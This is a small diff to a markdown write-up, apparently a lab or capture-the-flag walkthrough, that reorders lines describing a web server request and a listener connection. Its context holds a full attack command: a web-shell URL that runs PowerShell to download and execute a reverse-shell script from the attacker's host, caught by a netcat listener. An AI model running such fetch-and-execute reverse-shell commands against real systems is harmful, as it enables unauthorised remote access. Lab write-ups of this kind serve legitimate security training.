@@ -66,10 +66,11 @@ From here I'll write a powershell reverse shell in `shell.ps1` to call back to p
 
 I'll start a netcat listener on port 9001, then I'll visit the URL `http://10.10.10.97:8808/shell.php?cmd=powershell iex(iwr -uri http://10.10.14.31/shell.ps1 -usebasicparsing)`
 
+I get a request to my webserver
+
 <img src="images/webserve.png">
 
-I get a request to my webserver
+followed by a connection on my listener
 
 <img src="images/hit.png">
 
-followed by a connection on my listener
